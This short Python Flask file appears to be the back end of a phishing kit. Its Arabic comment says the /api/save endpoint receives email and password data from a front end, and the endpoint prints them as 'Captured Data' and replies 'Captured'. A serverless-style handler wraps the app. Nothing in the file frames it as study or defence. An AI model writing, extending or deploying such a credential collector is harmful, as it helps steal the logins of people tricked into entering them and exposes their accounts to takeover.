from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/save', methods=['POST'])
def save_data():
    data = request.json
    # استلام البيانات (إيميل وباسورد) من الواجهة
    print(f"Captured Data: {data}") 
    return jsonify({"status": "success", "message": "Captured"})

def handler(environ, start_response):
    return app(environ, start_response)
